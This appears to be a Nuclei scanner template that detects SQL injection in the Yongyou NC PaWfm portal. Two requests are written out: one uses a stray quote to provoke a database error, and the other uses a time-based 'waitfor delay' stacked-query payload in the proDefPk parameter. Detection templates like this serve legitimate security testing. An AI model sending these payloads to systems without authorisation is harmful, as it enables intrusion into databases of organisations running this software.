id: yongyou-nc-pawfm-sqli
info:
  name: Yongyou NC PaWfm SQL Injection Vulnerability
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection

variables:
  t1: '{{rand_int(5,10)}}'
  t2: '{{to_number(t1) + 2}}'

flow: |
  http(1) && http(2)

http:
  - id: "1"
    method: GET
    path:
      - "{{BaseURL}}/portal/pt/PaWfm/open?pageId=login&proDefPk=11'"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 500
      - type: word
        words:
          - "sql:"
      - type: word
        words:
          - "字符串 '11'' 后的引号不完整"

  - id: "2"
    method: GET
    path:
      - "{{BaseURL}}/portal/pt/PaWfm/open?pageId=login&proDefPk=11';waitfor+delay+'0:0:{{t1}}'--"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "<Url>@NOPRODEF@</Url>"
          - "?xml version="
      - type: dsl
        dsl:
          - "duration > to_number(t1)"
          - "duration < to_number(t2)"
